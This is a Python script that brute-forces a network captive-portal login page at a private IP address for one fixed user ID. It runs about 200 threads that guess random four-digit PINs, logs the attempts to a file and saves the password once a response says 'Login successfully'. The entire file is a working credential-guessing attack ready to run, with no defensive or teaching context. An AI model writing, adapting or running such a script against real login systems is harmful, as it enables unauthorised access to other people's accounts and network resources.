import requests, threading, time, random
reqs = requests.session()
class DIC:
    dictionarys = []
    isConn = False
Dic = DIC()
url = "http://172.16.0.1/portal/user-authen.php"
header = {
    "content-type":"application/x-www-form-urlencoded"
}
username = 151006
def result(x):
    df = open('result.txt', 'w')
    df.writelines(str(x))
    df.close()
def Addoldpassword(x):
    df = open('oldpassword.txt', 'a')
    df.writelines(str(x))
    df.close()
def Getoldpassword():
    df = open('oldpassword.txt', 'r',encoding='utf-8')
    return df
def randomNumber(main,length,Dic):
    x = main
    while(True):
        time.sleep(0.1)
        if Dic.isConn:break
        if len(Dic.dictionarys)==10000:break
        if(len(main)==length):
            if main not in Dic.dictionarys:
                body = {
                    "txtLogin":username,
                    "txtPasswd":main,
                    "btnLogin":"Login",
                    "reqUrl":"",
                    "reqCheck":"false"
                }
                try:
                    res = reqs.post(url=url,headers=header,data=body)
                    if not Dic.isConn or 1==1:
                        print(f"{len(Dic.dictionarys)} {main}")
                    if "Login successfully" in res.text:
                        print(f"Login successfully Password is ${main}")
                        result(f'usename : {username}, password : {main}')
                        Dic.isConn = True
                    Dic.dictionarys.append(main)
                    Addoldpassword(f'{main},')
                except:
                    pass
            main = x
        main += random.choice("0123456789")
Dic.dictionarys = Getoldpassword().read().split(',')
for i in range(100):
    threading.Thread(target=randomNumber,args=("",4,Dic,)).start()
    threading.Thread(target=randomNumber,args=("",4,Dic,)).start()
    # threading.Thread(target=randomNumber,args=("",4,Dic,)).start()
    # threading.Thread(target=randomNumber,args=("",4,Dic,)).start()
    # threading.Thread(target=randomNumber,args=("",4,Dic,)).start()
    # threading.Thread(target=randomNumber,args=("",4,Dic,)).start()
    # threading.Thread(target=randomNumber,args=("",4,Dic,)).start()
    # threading.Thread(target=randomNumber,args=("",4,Dic,)).start()
    # threading.Thread(target=randomNumber,args=("",4,Dic,)).start()
    # threading.Thread(target=randomNumber,args=("",4,Dic,)).start()
    # threading.Thread(target=randomNumber,args=("",4,Dic,)).start()
    # threading.Thread(target=randomNumber,args=("",4,Dic,)).start()